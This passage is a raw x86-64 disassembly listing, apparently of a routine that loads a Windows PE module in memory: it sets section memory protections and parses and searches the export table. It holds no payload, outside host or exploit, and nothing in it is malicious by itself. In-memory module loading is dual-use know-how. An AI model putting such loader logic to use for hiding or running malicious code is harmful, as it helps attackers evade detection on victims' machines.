    69dc1da1:	48 01 f9             	add    %rdi,%rcx
    69dc1da4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69dc1da9:	41 ff 56 28          	call   *0x28(%r14)
    69dc1dad:	48 85 c0             	test   %rax,%rax
    69dc1db0:	74 39                	je     0x69dc1deb
    69dc1db2:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
    69dc1db6:	8b 53 14             	mov    0x14(%rbx),%edx
    69dc1db9:	44 8b 43 10          	mov    0x10(%rbx),%r8d
    69dc1dbd:	49 01 f9             	add    %rdi,%r9
    69dc1dc0:	4c 01 ea             	add    %r13,%rdx
    69dc1dc3:	4c 89 c9             	mov    %r9,%rcx
    69dc1dc6:	e8 95 2f 00 00       	call   0x69dc4d60
    69dc1dcb:	89 43 08             	mov    %eax,0x8(%rbx)
    69dc1dce:	49 8b 06             	mov    (%r14),%rax
    69dc1dd1:	0f b7 40 06          	movzwl 0x6(%rax),%eax
    69dc1dd5:	eb 98                	jmp    0x69dc1d6f
    69dc1dd7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc1dde:	00 00 
    69dc1de0:	b9 0d 00 00 00       	mov    $0xd,%ecx
    69dc1de5:	ff 15 a9 a5 00 00    	call   *0xa5a9(%rip)        # 0x69dcc394
    69dc1deb:	31 c0                	xor    %eax,%eax
    69dc1ded:	48 83 c4 38          	add    $0x38,%rsp
    69dc1df1:	5b                   	pop    %rbx
    69dc1df2:	5e                   	pop    %rsi
    69dc1df3:	5f                   	pop    %rdi
    69dc1df4:	5d                   	pop    %rbp
    69dc1df5:	41 5c                	pop    %r12
    69dc1df7:	41 5d                	pop    %r13
    69dc1df9:	41 5e                	pop    %r14
    69dc1dfb:	41 5f                	pop    %r15
    69dc1dfd:	c3                   	ret
    69dc1dfe:	66 90                	xchg   %ax,%ax
    69dc1e00:	41 57                	push   %r15
    69dc1e02:	41 56                	push   %r14
    69dc1e04:	41 55                	push   %r13
    69dc1e06:	41 54                	push   %r12
    69dc1e08:	55                   	push   %rbp
    69dc1e09:	57                   	push   %rdi
    69dc1e0a:	56                   	push   %rsi
    69dc1e0b:	53                   	push   %rbx
    69dc1e0c:	48 83 ec 48          	sub    $0x48,%rsp
    69dc1e10:	4c 8b 09             	mov    (%rcx),%r9
    69dc1e13:	41 0f b7 41 14       	movzwl 0x14(%r9),%eax
    69dc1e18:	49 89 cd             	mov    %rcx,%r13
    69dc1e1b:	45 8b 45 68          	mov    0x68(%r13),%r8d
    69dc1e1f:	49 8d 74 01 18       	lea    0x18(%r9,%rax,1),%rsi
    69dc1e24:	48 b8 00 00 00 00 ff 	movabs $0xffffffff00000000,%rax
    69dc1e2b:	ff ff ff 
    69dc1e2e:	49 23 41 30          	and    0x30(%r9),%rax
    69dc1e32:	8b 4e 08             	mov    0x8(%rsi),%ecx
    69dc1e35:	4d 89 c3             	mov    %r8,%r11
    69dc1e38:	4c 89 c2             	mov    %r8,%rdx
    69dc1e3b:	44 8b 56 10          	mov    0x10(%rsi),%r10d
    69dc1e3f:	49 f7 db             	neg    %r11
    69dc1e42:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69dc1e47:	48 09 c1             	or     %rax,%rcx
    69dc1e4a:	8b 46 24             	mov    0x24(%rsi),%eax
    69dc1e4d:	49 21 cb             	and    %rcx,%r11
    69dc1e50:	45 85 d2             	test   %r10d,%r10d
    69dc1e53:	0f 84 8a 01 00 00    	je     0x69dc1fe3
    69dc1e59:	45 0f b7 79 06       	movzwl 0x6(%r9),%r15d
    69dc1e5e:	48 83 c6 28          	add    $0x28,%rsi
    69dc1e62:	66 41 83 ff 01       	cmp    $0x1,%r15w
    69dc1e67:	0f 86 9b 01 00 00    	jbe    0x69dc2008
    69dc1e6d:	48 8d 7c 24 3c       	lea    0x3c(%rsp),%rdi
    69dc1e72:	41 bc 01 00 00 00    	mov    $0x1,%r12d
    69dc1e78:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
    69dc1e7d:	e9 98 00 00 00       	jmp    0x69dc1f1a
    69dc1e82:	4d 85 d2             	test   %r10,%r10
    69dc1e85:	74 66                	je     0x69dc1eed
    69dc1e87:	a9 00 00 00 02       	test   $0x2000000,%eax
    69dc1e8c:	0f 85 ff 00 00 00    	jne    0x69dc1f91
    69dc1e92:	41 89 c1             	mov    %eax,%r9d
    69dc1e95:	41 89 c0             	mov    %eax,%r8d
    69dc1e98:	89 c2                	mov    %eax,%edx
    69dc1e9a:	41 c1 e9 1d          	shr    $0x1d,%r9d
    69dc1e9e:	41 c1 e8 1e          	shr    $0x1e,%r8d
    69dc1ea2:	41 83 e1 01          	and    $0x1,%r9d
    69dc1ea6:	41 83 e0 01          	and    $0x1,%r8d
    69dc1eaa:	c1 ea 1f             	shr    $0x1f,%edx
    69dc1ead:	4f 8d 04 48          	lea    (%r8,%r9,2),%r8
    69dc1eb1:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
    69dc1eb6:	4a 8d 14 42          	lea    (%rdx,%r8,2),%rdx
    69dc1eba:	4c 8d 3d 9f 51 00 00 	lea    0x519f(%rip),%r15        # 0x69dc7060
    69dc1ec1:	41 8b 14 97          	mov    (%r15,%rdx,4),%edx
    69dc1ec5:	41 89 d0             	mov    %edx,%r8d
    69dc1ec8:	41 81 c8 00 02 00 00 	or     $0x200,%r8d
    69dc1ecf:	a9 00 00 00 04       	test   $0x4000000,%eax
    69dc1ed4:	44 0f 44 c2          	cmove  %edx,%r8d
    69dc1ed8:	4c 89 d2             	mov    %r10,%rdx
    69dc1edb:	ff 15 f3 a4 00 00    	call   *0xa4f3(%rip)        # 0x69dcc3d4
    69dc1ee1:	85 c0                	test   %eax,%eax
    69dc1ee3:	0f 84 e7 00 00 00    	je     0x69dc1fd0
    69dc1ee9:	4d 8b 4d 00          	mov    0x0(%r13),%r9
    69dc1eed:	8b 46 24             	mov    0x24(%rsi),%eax
    69dc1ef0:	48 89 f9             	mov    %rdi,%rcx
    69dc1ef3:	49 89 ea             	mov    %rbp,%r10
    69dc1ef6:	49 89 db             	mov    %rbx,%r11
    69dc1ef9:	45 0f b7 79 06       	movzwl 0x6(%r9),%r15d
    69dc1efe:	41 83 c4 01          	add    $0x1,%r12d
    69dc1f02:	41 0f b7 d7          	movzwl %r15w,%edx
    69dc1f06:	48 83 c6 28          	add    $0x28,%rsi
    69dc1f0a:	44 39 e2             	cmp    %r12d,%edx
    69dc1f0d:	0f 8e f0 00 00 00    	jle    0x69dc2003
    69dc1f13:	45 8b 45 68          	mov    0x68(%r13),%r8d
    69dc1f17:	4c 89 c2             	mov    %r8,%rdx
    69dc1f1a:	8b 7e 08             	mov    0x8(%rsi),%edi
    69dc1f1d:	4c 89 c3             	mov    %r8,%rbx
    69dc1f20:	48 0b 7c 24 20       	or     0x20(%rsp),%rdi
    69dc1f25:	48 f7 db             	neg    %rbx
    69dc1f28:	8b 6e 10             	mov    0x10(%rsi),%ebp
    69dc1f2b:	48 21 fb             	and    %rdi,%rbx
    69dc1f2e:	85 ed                	test   %ebp,%ebp
    69dc1f30:	75 0e                	jne    0x69dc1f40
    69dc1f32:	44 8b 76 24          	mov    0x24(%rsi),%r14d
    69dc1f36:	41 f6 c6 40          	test   $0x40,%r14b
    69dc1f3a:	74 44                	je     0x69dc1f80
    69dc1f3c:	41 8b 69 20          	mov    0x20(%r9),%ebp
    69dc1f40:	49 39 db             	cmp    %rbx,%r11
    69dc1f43:	74 0d                	je     0x69dc1f52
    69dc1f45:	4d 8d 34 0a          	lea    (%r10,%rcx,1),%r14
    69dc1f49:	49 39 de             	cmp    %rbx,%r14
    69dc1f4c:	0f 86 30 ff ff ff    	jbe    0x69dc1e82
    69dc1f52:	8b 56 24             	mov    0x24(%rsi),%edx
    69dc1f55:	41 89 d0             	mov    %edx,%r8d
    69dc1f58:	41 09 c0             	or     %eax,%r8d
    69dc1f5b:	81 e2 00 00 00 02    	and    $0x2000000,%edx
    69dc1f61:	74 0a                	je     0x69dc1f6d
    69dc1f63:	25 00 00 00 02       	and    $0x2000000,%eax
    69dc1f68:	44 89 c0             	mov    %r8d,%eax
    69dc1f6b:	75 08                	jne    0x69dc1f75
    69dc1f6d:	44 89 c0             	mov    %r8d,%eax
    69dc1f70:	25 ff ff ff fd       	and    $0xfdffffff,%eax
    69dc1f75:	48 29 cf             	sub    %rcx,%rdi
    69dc1f78:	4c 8d 14 2f          	lea    (%rdi,%rbp,1),%r10
    69dc1f7c:	eb 80                	jmp    0x69dc1efe
    69dc1f7e:	66 90                	xchg   %ax,%ax
    69dc1f80:	31 ed                	xor    %ebp,%ebp
    69dc1f82:	41 81 e6 80 00 00 00 	and    $0x80,%r14d
    69dc1f89:	74 b5                	je     0x69dc1f40
    69dc1f8b:	41 8b 69 24          	mov    0x24(%r9),%ebp
    69dc1f8f:	eb af                	jmp    0x69dc1f40
    69dc1f91:	49 39 cb             	cmp    %rcx,%r11
    69dc1f94:	0f 85 53 ff ff ff    	jne    0x69dc1eed
    69dc1f9a:	41 39 51 38          	cmp    %edx,0x38(%r9)
    69dc1f9e:	74 11                	je     0x69dc1fb1
    69dc1fa0:	31 d2                	xor    %edx,%edx
    69dc1fa2:	4c 89 d0             	mov    %r10,%rax
    69dc1fa5:	49 f7 f0             	div    %r8
    69dc1fa8:	48 85 d2             	test   %rdx,%rdx
    69dc1fab:	0f 85 3c ff ff ff    	jne    0x69dc1eed
    69dc1fb1:	4d 8b 4d 58          	mov    0x58(%r13),%r9
    69dc1fb5:	41 b8 00 40 00 00    	mov    $0x4000,%r8d
    69dc1fbb:	4c 89 d2             	mov    %r10,%rdx
    69dc1fbe:	41 ff 55 30          	call   *0x30(%r13)
    69dc1fc2:	4d 8b 4d 00          	mov    0x0(%r13),%r9
    69dc1fc6:	e9 22 ff ff ff       	jmp    0x69dc1eed
    69dc1fcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc1fd0:	31 c0                	xor    %eax,%eax
    69dc1fd2:	48 83 c4 48          	add    $0x48,%rsp
    69dc1fd6:	5b                   	pop    %rbx
    69dc1fd7:	5e                   	pop    %rsi
    69dc1fd8:	5f                   	pop    %rdi
    69dc1fd9:	5d                   	pop    %rbp
    69dc1fda:	41 5c                	pop    %r12
    69dc1fdc:	41 5d                	pop    %r13
    69dc1fde:	41 5e                	pop    %r14
    69dc1fe0:	41 5f                	pop    %r15
    69dc1fe2:	c3                   	ret
    69dc1fe3:	a8 40                	test   $0x40,%al
    69dc1fe5:	0f 84 85 00 00 00    	je     0x69dc2070
    69dc1feb:	45 8b 51 20          	mov    0x20(%r9),%r10d
    69dc1fef:	45 0f b7 79 06       	movzwl 0x6(%r9),%r15d
    69dc1ff4:	48 83 c6 28          	add    $0x28,%rsi
    69dc1ff8:	66 41 83 ff 01       	cmp    $0x1,%r15w
    69dc1ffd:	0f 87 6a fe ff ff    	ja     0x69dc1e6d
    69dc2003:	4d 85 d2             	test   %r10,%r10
    69dc2006:	74 5e                	je     0x69dc2066
    69dc2008:	a9 00 00 00 02       	test   $0x2000000,%eax
    69dc200d:	0f 85 8d 00 00 00    	jne    0x69dc20a0
    69dc2013:	41 89 c1             	mov    %eax,%r9d
    69dc2016:	41 89 c0             	mov    %eax,%r8d
    69dc2019:	89 c2                	mov    %eax,%edx
    69dc201b:	41 c1 e9 1d          	shr    $0x1d,%r9d
    69dc201f:	41 c1 e8 1e          	shr    $0x1e,%r8d
    69dc2023:	41 83 e1 01          	and    $0x1,%r9d
    69dc2027:	41 83 e0 01          	and    $0x1,%r8d
    69dc202b:	c1 ea 1f             	shr    $0x1f,%edx
    69dc202e:	4f 8d 04 48          	lea    (%r8,%r9,2),%r8
    69dc2032:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
    69dc2036:	48 8d 15 23 50 00 00 	lea    0x5023(%rip),%rdx        # 0x69dc7060
    69dc203d:	46 8b 04 82          	mov    (%rdx,%r8,4),%r8d
    69dc2041:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
    69dc2046:	44 89 c2             	mov    %r8d,%edx
    69dc2049:	80 ce 02             	or     $0x2,%dh
    69dc204c:	a9 00 00 00 04       	test   $0x4000000,%eax
    69dc2051:	44 0f 45 c2          	cmovne %edx,%r8d
    69dc2055:	4c 89 d2             	mov    %r10,%rdx
    69dc2058:	ff 15 76 a3 00 00    	call   *0xa376(%rip)        # 0x69dcc3d4
    69dc205e:	85 c0                	test   %eax,%eax
    69dc2060:	0f 84 6c ff ff ff    	je     0x69dc1fd2
    69dc2066:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc206b:	e9 62 ff ff ff       	jmp    0x69dc1fd2
    69dc2070:	a8 80                	test   $0x80,%al
    69dc2072:	74 09                	je     0x69dc207d
    69dc2074:	45 8b 51 24          	mov    0x24(%r9),%r10d
    69dc2078:	e9 72 ff ff ff       	jmp    0x69dc1fef
    69dc207d:	45 0f b7 79 06       	movzwl 0x6(%r9),%r15d
    69dc2082:	48 83 c6 28          	add    $0x28,%rsi
    69dc2086:	45 31 d2             	xor    %r10d,%r10d
    69dc2089:	66 41 83 ff 01       	cmp    $0x1,%r15w
    69dc208e:	0f 87 d9 fd ff ff    	ja     0x69dc1e6d
    69dc2094:	eb d0                	jmp    0x69dc2066
    69dc2096:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc209d:	00 00 00 
    69dc20a0:	49 39 cb             	cmp    %rcx,%r11
    69dc20a3:	75 c1                	jne    0x69dc2066
    69dc20a5:	4d 8b 4d 58          	mov    0x58(%r13),%r9
    69dc20a9:	41 b8 00 40 00 00    	mov    $0x4000,%r8d
    69dc20af:	4c 89 d2             	mov    %r10,%rdx
    69dc20b2:	4c 89 d9             	mov    %r11,%rcx
    69dc20b5:	41 ff 55 30          	call   *0x30(%r13)
    69dc20b9:	eb ab                	jmp    0x69dc2066
    69dc20bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc20c0:	41 57                	push   %r15
    69dc20c2:	41 56                	push   %r14
    69dc20c4:	41 55                	push   %r13
    69dc20c6:	41 54                	push   %r12
    69dc20c8:	55                   	push   %rbp
    69dc20c9:	57                   	push   %rdi
    69dc20ca:	56                   	push   %rsi
    69dc20cb:	53                   	push   %rbx
    69dc20cc:	48 83 ec 48          	sub    $0x48,%rsp
    69dc20d0:	48 8b 01             	mov    (%rcx),%rax
    69dc20d3:	48 8b 71 08          	mov    0x8(%rcx),%rsi
    69dc20d7:	48 89 cf             	mov    %rcx,%rdi
    69dc20da:	8b 88 8c 00 00 00    	mov    0x8c(%rax),%ecx
    69dc20e0:	48 89 94 24 98 00 00 	mov    %rdx,0x98(%rsp)
    69dc20e7:	00 
    69dc20e8:	85 c9                	test   %ecx,%ecx
    69dc20ea:	0f 84 90 00 00 00    	je     0x69dc2180
    69dc20f0:	8b 98 88 00 00 00    	mov    0x88(%rax),%ebx
    69dc20f6:	48 01 f3             	add    %rsi,%rbx
    69dc20f9:	8b 6b 18             	mov    0x18(%rbx),%ebp
    69dc20fc:	85 ed                	test   %ebp,%ebp
    69dc20fe:	0f 84 7c 00 00 00    	je     0x69dc2180
    69dc2104:	8b 43 14             	mov    0x14(%rbx),%eax
    69dc2107:	85 c0                	test   %eax,%eax
    69dc2109:	74 75                	je     0x69dc2180
    69dc210b:	f7 c2 00 00 ff ff    	test   $0xffff0000,%edx
    69dc2111:	74 5e                	je     0x69dc2171
    69dc2113:	48 8b 57 50          	mov    0x50(%rdi),%rdx
    69dc2117:	41 89 ec             	mov    %ebp,%r12d
    69dc211a:	48 85 d2             	test   %rdx,%rdx
    69dc211d:	74 71                	je     0x69dc2190
    69dc211f:	48 8d 05 da f8 ff ff 	lea    -0x726(%rip),%rax        # 0x69dc1a00
    69dc2126:	41 b9 10 00 00 00    	mov    $0x10,%r9d
    69dc212c:	4d 89 e0             	mov    %r12,%r8
    69dc212f:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
    69dc2136:	00 
    69dc2137:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69dc213c:	e8 7f 2c 00 00       	call   0x69dc4dc0
    69dc2141:	48 85 c0             	test   %rax,%rax
    69dc2144:	74 3a                	je     0x69dc2180
    69dc2146:	0f b7 50 08          	movzwl 0x8(%rax),%edx
    69dc214a:	8b 43 14             	mov    0x14(%rbx),%eax
    69dc214d:	39 c2                	cmp    %eax,%edx
    69dc214f:	77 2f                	ja     0x69dc2180
    69dc2151:	8b 43 1c             	mov    0x1c(%rbx),%eax
    69dc2154:	c1 e2 02             	shl    $0x2,%edx
    69dc2157:	48 01 f0             	add    %rsi,%rax
    69dc215a:	8b 04 10             	mov    (%rax,%rdx,1),%eax
    69dc215d:	48 01 f0             	add    %rsi,%rax
    69dc2160:	48 83 c4 48          	add    $0x48,%rsp
    69dc2164:	5b                   	pop    %rbx
    69dc2165:	5e                   	pop    %rsi
    69dc2166:	5f                   	pop    %rdi
    69dc2167:	5d                   	pop    %rbp
    69dc2168:	41 5c                	pop    %r12
    69dc216a:	41 5d                	pop    %r13
    69dc216c:	41 5e                	pop    %r14
    69dc216e:	41 5f                	pop    %r15
    69dc2170:	c3                   	ret
    69dc2171:	8b 4b 10             	mov    0x10(%rbx),%ecx
    69dc2174:	0f b7 d2             	movzwl %dx,%edx
    69dc2177:	39 ca                	cmp    %ecx,%edx
    69dc2179:	72 05                	jb     0x69dc2180
    69dc217b:	29 ca                	sub    %ecx,%edx
    69dc217d:	eb ce                	jmp    0x69dc214d
    69dc217f:	90                   	nop
    69dc2180:	b9 7f 00 00 00       	mov    $0x7f,%ecx
    69dc2185:	ff 15 09 a2 00 00    	call   *0xa209(%rip)        # 0x69dcc394
    69dc218b:	31 c0                	xor    %eax,%eax
    69dc218d:	eb d1                	jmp    0x69dc2160
    69dc218f:	90                   	nop
    69dc2190:	8b 53 24             	mov    0x24(%rbx),%edx
    69dc2193:	4d 89 e7             	mov    %r12,%r15
    69dc2196:	44 8b 6b 20          	mov    0x20(%rbx),%r13d
    69dc219a:	49 c1 e7 04          	shl    $0x4,%r15
    69dc219e:	4c 89 f9             	mov    %r15,%rcx
    69dc21a1:	4c 8d 34 16          	lea    (%rsi,%rdx,1),%r14
    69dc21a5:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
    69dc21aa:	e8 c1 2b 00 00       	call   0x69dc4d70
    69dc21af:	49 01 f5             	add    %rsi,%r13
    69dc21b2:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    69dc21b7:	48 85 c0             	test   %rax,%rax
    69dc21ba:	48 89 47 50          	mov    %rax,0x50(%rdi)
    69dc21be:	0f 84 6e 02 00 00    	je     0x69dc2432
    69dc21c4:	4a 8d 14 62          	lea    (%rdx,%r12,2),%rdx
    69dc21c8:	4c 8d 40 08          	lea    0x8(%rax),%r8
    69dc21cc:	48 01 f2             	add    %rsi,%rdx
    69dc21cf:	8d 4d ff             	lea    -0x1(%rbp),%ecx
    69dc21d2:	49 39 d0             	cmp    %rdx,%r8
    69dc21d5:	4a 8d 54 38 fa       	lea    -0x6(%rax,%r15,1),%rdx
    69dc21da:	41 0f 93 c0          	setae  %r8b
    69dc21de:	49 39 d6             	cmp    %rdx,%r14
    69dc21e1:	0f 93 c2             	setae  %dl
    69dc21e4:	41 08 d0             	or     %dl,%r8b
    69dc21e7:	0f 84 13 02 00 00    	je     0x69dc2400
    69dc21ed:	83 f9 07             	cmp    $0x7,%ecx
    69dc21f0:	0f 86 0a 02 00 00    	jbe    0x69dc2400
    69dc21f6:	89 ea                	mov    %ebp,%edx
    69dc21f8:	66 48 0f 6e ee       	movq   %rsi,%xmm5
    69dc21fd:	4d 89 ea             	mov    %r13,%r10
    69dc2200:	66 0f ef e4          	pxor   %xmm4,%xmm4
    69dc2204:	c1 ea 03             	shr    $0x3,%edx
    69dc2207:	49 89 c0             	mov    %rax,%r8
    69dc220a:	4d 89 f3             	mov    %r14,%r11
    69dc220d:	66 0f 6c ed          	punpcklqdq %xmm5,%xmm5
    69dc2211:	48 c1 e2 05          	shl    $0x5,%rdx
    69dc2215:	4c 01 ea             	add    %r13,%rdx
    69dc2218:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc221f:	00 
    69dc2220:	f3 41 0f 6f 42 10    	movdqu 0x10(%r10),%xmm0
    69dc2226:	49 83 c2 20          	add    $0x20,%r10
    69dc222a:	49 83 e8 80          	sub    $0xffffffffffffff80,%r8
    69dc222e:	49 83 c3 10          	add    $0x10,%r11
    69dc2232:	f3 41 0f 6f 4a e0    	movdqu -0x20(%r10),%xmm1
    69dc2238:	66 0f 6f d0          	movdqa %xmm0,%xmm2
    69dc223c:	66 0f 6a c4          	punpckhdq %xmm4,%xmm0
    69dc2240:	66 0f d4 c5          	paddq  %xmm5,%xmm0
    69dc2244:	66 41 0f d6 40 e0    	movq   %xmm0,-0x20(%r8)
    69dc224a:	66 0f 6f d9          	movdqa %xmm1,%xmm3
    69dc224e:	66 0f 62 d4          	punpckldq %xmm4,%xmm2
    69dc2252:	66 0f 6a cc          	punpckhdq %xmm4,%xmm1
    69dc2256:	41 0f 17 40 f0       	movhps %xmm0,-0x10(%r8)
    69dc225b:	66 0f d4 cd          	paddq  %xmm5,%xmm1
    69dc225f:	66 0f d4 d5          	paddq  %xmm5,%xmm2
    69dc2263:	66 0f 62 dc          	punpckldq %xmm4,%xmm3
    69dc2267:	f3 41 0f 6f 43 f0    	movdqu -0x10(%r11),%xmm0
    69dc226d:	66 0f d4 dd          	paddq  %xmm5,%xmm3
    69dc2271:	41 0f 17 48 b0       	movhps %xmm1,-0x50(%r8)
    69dc2276:	66 41 0f d6 58 80    	movq   %xmm3,-0x80(%r8)
    69dc227c:	41 0f 17 58 90       	movhps %xmm3,-0x70(%r8)
    69dc2281:	66 0f c5 c8 00       	pextrw $0x0,%xmm0,%ecx
    69dc2286:	66 44 0f c5 c8 07    	pextrw $0x7,%xmm0,%r9d
    69dc228c:	66 41 89 48 88       	mov    %cx,-0x78(%r8)
    69dc2291:	66 0f c5 c8 01       	pextrw $0x1,%xmm0,%ecx
    69dc2296:	66 41 0f d6 48 a0    	movq   %xmm1,-0x60(%r8)
    69dc229c:	66 41 89 48 98       	mov    %cx,-0x68(%r8)
    69dc22a1:	66 0f c5 c8 02       	pextrw $0x2,%xmm0,%ecx
    69dc22a6:	66 41 0f d6 50 c0    	movq   %xmm2,-0x40(%r8)
    69dc22ac:	66 41 89 48 a8       	mov    %cx,-0x58(%r8)
    69dc22b1:	66 0f c5 c8 03       	pextrw $0x3,%xmm0,%ecx
    69dc22b6:	41 0f 17 50 d0       	movhps %xmm2,-0x30(%r8)
    69dc22bb:	66 41 89 48 b8       	mov    %cx,-0x48(%r8)
    69dc22c0:	66 0f c5 c8 04       	pextrw $0x4,%xmm0,%ecx
    69dc22c5:	66 45 89 48 f8       	mov    %r9w,-0x8(%r8)
    69dc22ca:	66 41 89 48 c8       	mov    %cx,-0x38(%r8)
    69dc22cf:	66 0f c5 c8 05       	pextrw $0x5,%xmm0,%ecx
    69dc22d4:	66 41 89 48 d8       	mov    %cx,-0x28(%r8)
    69dc22d9:	66 0f c5 c8 06       	pextrw $0x6,%xmm0,%ecx
    69dc22de:	66 41 89 48 e8       	mov    %cx,-0x18(%r8)
    69dc22e3:	49 39 d2             	cmp    %rdx,%r10
    69dc22e6:	0f 85 34 ff ff ff    	jne    0x69dc2220
    69dc22ec:	89 ea                	mov    %ebp,%edx
    69dc22ee:	83 e2 f8             	and    $0xfffffff8,%edx
    69dc22f1:	41 89 d0             	mov    %edx,%r8d
    69dc22f4:	4f 8d 4c 85 00       	lea    0x0(%r13,%r8,4),%r9
    69dc22f9:	4b 8d 0c 46          	lea    (%r14,%r8,2),%rcx
    69dc22fd:	49 c1 e0 04          	shl    $0x4,%r8
    69dc2301:	49 01 c0             	add    %rax,%r8
    69dc2304:	39 d5                	cmp    %edx,%ebp
    69dc2306:	0f 84 cb 00 00 00    	je     0x69dc23d7
    69dc230c:	45 8b 11             	mov    (%r9),%r10d
    69dc230f:	49 01 f2             	add    %rsi,%r10
    69dc2312:	4d 89 10             	mov    %r10,(%r8)
    69dc2315:	44 0f b7 11          	movzwl (%rcx),%r10d
    69dc2319:	66 45 89 50 08       	mov    %r10w,0x8(%r8)
    69dc231e:	44 8d 52 01          	lea    0x1(%rdx),%r10d
    69dc2322:	44 39 d5             	cmp    %r10d,%ebp
    69dc2325:	0f 86 ac 00 00 00    	jbe    0x69dc23d7
    69dc232b:	45 8b 51 04          	mov    0x4(%r9),%r10d
    69dc232f:	49 01 f2             	add    %rsi,%r10
    69dc2332:	4d 89 50 10          	mov    %r10,0x10(%r8)
    69dc2336:	44 0f b7 51 02       	movzwl 0x2(%rcx),%r10d
    69dc233b:	66 45 89 50 18       	mov    %r10w,0x18(%r8)
    69dc2340:	44 8d 52 02          	lea    0x2(%rdx),%r10d
    69dc2344:	44 39 d5             	cmp    %r10d,%ebp
    69dc2347:	0f 86 8a 00 00 00    	jbe    0x69dc23d7
    69dc234d:	45 8b 51 08          	mov    0x8(%r9),%r10d
    69dc2351:	49 01 f2             	add    %rsi,%r10
    69dc2354:	4d 89 50 20          	mov    %r10,0x20(%r8)
    69dc2358:	44 0f b7 51 04       	movzwl 0x4(%rcx),%r10d
    69dc235d:	66 45 89 50 28       	mov    %r10w,0x28(%r8)
    69dc2362:	44 8d 52 03          	lea    0x3(%rdx),%r10d
    69dc2366:	44 39 d5             	cmp    %r10d,%ebp
    69dc2369:	76 6c                	jbe    0x69dc23d7
    69dc236b:	45 8b 51 0c          	mov    0xc(%r9),%r10d
    69dc236f:	49 01 f2             	add    %rsi,%r10
    69dc2372:	4d 89 50 30          	mov    %r10,0x30(%r8)
    69dc2376:	44 0f b7 51 06       	movzwl 0x6(%rcx),%r10d
    69dc237b:	66 45 89 50 38       	mov    %r10w,0x38(%r8)
    69dc2380:	44 8d 52 04          	lea    0x4(%rdx),%r10d
    69dc2384:	44 39 d5             	cmp    %r10d,%ebp
    69dc2387:	76 4e                	jbe    0x69dc23d7
    69dc2389:	45 8b 51 10          	mov    0x10(%r9),%r10d
    69dc238d:	49 01 f2             	add    %rsi,%r10
    69dc2390:	4d 89 50 40          	mov    %r10,0x40(%r8)
    69dc2394:	44 0f b7 51 08       	movzwl 0x8(%rcx),%r10d
    69dc2399:	66 45 89 50 48       	mov    %r10w,0x48(%r8)
    69dc239e:	44 8d 52 05          	lea    0x5(%rdx),%r10d
    69dc23a2:	44 39 d5             	cmp    %r10d,%ebp
    69dc23a5:	76 30                	jbe    0x69dc23d7
    69dc23a7:	45 8b 51 14          	mov    0x14(%r9),%r10d
    69dc23ab:	83 c2 06             	add    $0x6,%edx
    69dc23ae:	49 01 f2             	add    %rsi,%r10
    69dc23b1:	39 d5                	cmp    %edx,%ebp
    69dc23b3:	4d 89 50 50          	mov    %r10,0x50(%r8)
    69dc23b7:	44 0f b7 51 0a       	movzwl 0xa(%rcx),%r10d
    69dc23bc:	66 45 89 50 58       	mov    %r10w,0x58(%r8)
    69dc23c1:	76 14                	jbe    0x69dc23d7
    69dc23c3:	41 8b 51 18          	mov    0x18(%r9),%edx
    69dc23c7:	48 01 f2             	add    %rsi,%rdx
    69dc23ca:	49 89 50 60          	mov    %rdx,0x60(%r8)
    69dc23ce:	0f b7 51 0c          	movzwl 0xc(%rcx),%edx
    69dc23d2:	66 41 89 50 68       	mov    %dx,0x68(%r8)
    69dc23d7:	4c 89 e2             	mov    %r12,%rdx
    69dc23da:	41 b8 10 00 00 00    	mov    $0x10,%r8d
    69dc23e0:	48 89 c1             	mov    %rax,%rcx
    69dc23e3:	4c 8d 0d 26 f6 ff ff 	lea    -0x9da(%rip),%r9        # 0x69dc1a10
    69dc23ea:	e8 61 29 00 00       	call   0x69dc4d50
    69dc23ef:	44 8b 63 18          	mov    0x18(%rbx),%r12d
    69dc23f3:	48 8b 57 50          	mov    0x50(%rdi),%rdx
    69dc23f7:	e9 23 fd ff ff       	jmp    0x69dc211f
    69dc23fc:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc2400:	48 8d 4c 09 02       	lea    0x2(%rcx,%rcx,1),%rcx
    69dc2405:	45 31 c0             	xor    %r8d,%r8d
    69dc2408:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc240f:	00 
    69dc2410:	43 8b 54 45 00       	mov    0x0(%r13,%r8,2),%edx
    69dc2415:	48 01 f2             	add    %rsi,%rdx
    69dc2418:	4a 89 14 c0          	mov    %rdx,(%rax,%r8,8)
    69dc241c:	43 0f b7 14 06       	movzwl (%r14,%r8,1),%edx
    69dc2421:	66 42 89 54 c0 08    	mov    %dx,0x8(%rax,%r8,8)
    69dc2427:	49 83 c0 02          	add    $0x2,%r8
    69dc242b:	49 39 c8             	cmp    %rcx,%r8
    69dc242e:	75 e0                	jne    0x69dc2410
    69dc2430:	eb a5                	jmp    0x69dc23d7
    69dc2432:	b9 0e 00 00 00       	mov    $0xe,%ecx
    69dc2437:	ff 15 57 9f 00 00    	call   *0x9f57(%rip)        # 0x69dcc394
    69dc243d:	31 c0                	xor    %eax,%eax
    69dc243f:	e9 1c fd ff ff       	jmp    0x69dc2160
    69dc2444:	66 90                	xchg   %ax,%ax
    69dc2446:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc244d:	00 00 00 
    69dc2450:	41 54                	push   %r12
    69dc2452:	55                   	push   %rbp
    69dc2453:	57                   	push   %rdi
    69dc2454:	56                   	push   %rsi
    69dc2455:	53                   	push   %rbx
    69dc2456:	48 83 ec 20          	sub    $0x20,%rsp
